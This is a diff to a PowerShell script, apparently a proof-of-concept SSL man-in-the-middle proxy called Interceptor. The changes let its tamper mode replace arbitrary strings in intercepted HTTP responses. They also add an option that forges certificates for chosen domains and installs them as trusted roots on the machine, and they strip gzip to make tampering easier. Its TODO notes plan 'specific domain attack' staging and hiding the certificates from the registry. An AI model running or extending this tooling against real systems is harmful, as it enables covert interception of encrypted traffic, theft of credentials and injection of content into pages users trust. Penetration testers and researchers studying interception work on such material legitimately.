@@ -52,12 +52,24 @@ This will alter the proxy settings to drive traffic through Interceptor.
 
 Removes any installed certificates and exits.
 
+.PARAMETER SearchString
+
+If Tamper is enabled, this will search for a string to be replace. To be used with 'ReplaceString' parameter
+
+.PARAMETER ReplaceString
+
+If Tamper is enabled, this will be the string that replaces the string identified by the 'SearchString' parameter
+
+.PARAMETER Domains
+
+Accepts a list of domains to create Trusted root Certs for at the beginning of script run.List should be delimited with a comma ',' .
 
 .EXAMPLE
 
 Interceptor.ps1 -ProxyServer localhost -ProxyPort 8888 
 Interceptor.ps1 -Tamper 
 Interceptor.ps1 -HostCA
+Interceptor.ps1 -Domains "www.fakedomain1.com,www.fakedomain2.com"
 
 .NOTES
 This script attempts to make SSL MITM accessible, by being a small compact proof of concept script.  
@@ -90,7 +102,16 @@ Param(
   [switch]$AutoProxyConfig,
   
   [Parameter(Mandatory=$False,Position=6)]
-  [switch]$Cleanup
+  [switch]$Cleanup,
+
+  [Parameter(Mandatory=$False,Position=7)] 
+  [string]$SearchString,
+
+  [Parameter(Mandatory=$False,Position=8)] 
+  [string]$ReplaceString,
+
+  [Parameter(Mandatory=$False, Position=9)]
+  [string]$Domains
 )
 
 function Set-AutomaticallyDetectProxySettings ($enable) 
@@ -193,9 +214,27 @@ function Invoke-RemoveCertificates([string] $issuedBy)
 			$store.Close()
 		}
 	}
+
+	#Remove Any Intermediate CA Certificates                                               #spaceB0x!
+	$certs = Get-ChildItem cert:\LocalMachine\CA | where { $_.Issuer -match $issuedBy }
+	if($certs)
+	{
+	foreach ($cert in $certs) 
+		{
+			$store = Get-Item $cert.PSParentPath
+			$store.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::MaxAllowed)
+			$store.Remove($cert)
+			$store.Close()
+		}
+	}
+
 	[Console]::WriteLine("Certificates Removed")
 		
 }
+
+# Customize key length
+# Could add [System.Runtime.Interopservices.Marshal]::ReleaseComObject($x) at end to get rid of "-com processes" http://technet.microsoft.com/en-us/library/ff730962.aspx
+# Could maybe customize Cert Names
 
 function Invoke-CreateCertificate([string] $certSubject, [bool] $isCA)
 {
@@ -203,7 +242,7 @@ function Invoke-CreateCertificate([string] $certSubject, [bool] $isCA)
 	$dn = new-object -com "X509Enrollment.CX500DistinguishedName"
 	$dn.Encode( "CN=" + $CAsubject, $dn.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
 	#Issuer Property for cleanup
-	$issuer = "__Interceptor_Trusted_Root"
+    $issuer = "__Interceptor_Trusted_Root"
 	$issuerdn = new-object -com "X509Enrollment.CX500DistinguishedName"
 	$issuerdn.Encode("CN=" + $issuer, $dn.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
 	# Create a new Private Key
@@ -332,9 +371,17 @@ function Receive-ServerHttpResponse ([System.Net.WebResponse] $response)
 			
 			if ($Tamper)
 			{
-				if($responseFromServer -match 'Cyber')
+                if (($SearchString -ne $null) -and ($ReplaceString -ne $null))
+                {
+                    if($responseFromServer -match $SearchString)
+                    {
+                        $responseFromServer = $responseFromServer -replace $SearchString,$ReplaceString
+                    }
+                }
+
+				else 
 				{
-					$responseFromServer = $responseFromServer -replace 'Cyber', 'Kitten'
+					$responseFromServer = $responseFromServer -replace 'Cyber', 'Kitten'   # First junk to try
 				}
 			}
 			
@@ -431,7 +478,7 @@ function Send-ServerHttpRequest([string] $URI, [string] $httpMethod,[byte[]] $re
 					default {
 								if($line[0] -eq "Accept-Encoding")
 								{	
-									$request.Headers.Add( $line[0], " ") #Take that Gzip...
+									$request.Headers.Add( $line[0], " ") #Take that Gzip...      GETS rid of gzip compression....makes tampering easeir
 									#Otherwise have to decompress response to tamper with content...
 								}
 								else
@@ -449,7 +496,7 @@ function Send-ServerHttpRequest([string] $URI, [string] $httpMethod,[byte[]] $re
 			}
 		}
 			
-		if (($httpMethod -eq "POST") -And ($request.ContentLength -gt 0)) 
+		if (($httpMethod -eq "POST") -And ($request.ContentLength -gt 0)) ##Allows the ability to tread POST requests differently
 		{
 			[System.IO.Stream] $outputStream = [System.IO.Stream]$request.GetRequestStream()
 			$outputStream.Write($requestBytes, $requestBytes.Length - $request.ContentLength, $request.ContentLength)
@@ -592,9 +639,37 @@ function Main()
 	{
 		Invoke-CreateCertificate "__Interceptor_Trusted_Root" $true
 	}
+
 	# Create Some Certificates Early to Speed up Capture. If you wanted to...
 	# You could Add Auto Proxy Configuration here too.
-	
+    if($Domains -ne $null)                                                               
+    {
+
+
+         
+         [string[]] $domainList = ($Domains -split '[,]') |? {$_} 
+         foreach ($d in $domainList)
+         {
+             Write-Host $d
+             $sslcertfake = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -eq "CN=" + $d })
+
+             if($sslcertfake -eq $null){
+                 $sslcertfake = Invoke-CreateCertificate $d $true
+             }
+            # Taken from Invoke-CreateCertificate method
+		    # Install CA Root Certificate
+		    $StoreScope = "LocalMachine"
+		    $StoreName = "Root"
+		    $store = New-Object System.Security.Cryptography.X509Certificates.X509Store $StoreName, $StoreScope
+		    $store.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadWrite)
+		    $store.Add($sslcertfake)
+		    $store.Close()
+
+         }
+
+    }	
+
+
 	if($HostCA)
 	{
 		netsh advfirewall firewall delete rule name="Interceptor Proxy 8082" | Out-Null #First Run May Throw Error...Thats Ok..:)
@@ -689,3 +764,9 @@ function Main()
 
 Main
 
+# TODO
+
+# Pre-stage certs for specific domain attack (creating them dynamically is 'expensive')
+# Find a way to encode certs so they don't store in registry
+# Maybe switch 'httpwebrequest' at a socket level instead
+# Perhaps find alternative for BlockCopy in 'Receiveserverhttpresponse"
